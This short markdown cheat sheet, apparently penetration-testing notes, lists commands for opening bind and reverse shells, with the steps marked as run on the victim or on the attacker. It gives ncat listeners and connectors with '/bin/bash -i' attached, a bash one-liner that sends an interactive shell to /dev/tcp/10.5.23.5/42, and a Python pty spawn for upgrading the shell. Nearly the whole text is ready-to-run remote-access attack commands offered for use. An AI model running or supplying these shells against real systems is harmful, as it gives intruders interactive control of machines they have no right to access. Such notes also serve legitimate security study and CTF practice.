#### Useful text file:
[Get Stable Shell Info.txt](https://github.com/NavKang/NavKang/files/6135416/Get.Stable.Shell.Info.txt)
## Shells  

#### Start bind shell (on victim):
+ ncat -l -p PORT -e "/bin/bash -i"
--------
#### Connect to bind shell (on attacker):
+ ncat --ip-- --port--
--------
#### Listen for reverse shell (on attacker):
+ ncat -l -p PORT
--------
#### Start reverse shell (on victim):
+ ncat -e "/bin/bash -i" IPaddr
--------
#### Start reverse shell with bash only (on victim):
+ bash -i &>/dev/tcp/10.5.23.5/42 0>&1
--------
#### Upgrade to pseudo terminal:
+ python -c 'import pty;
pty.spawn("/bin/bash")'
--------


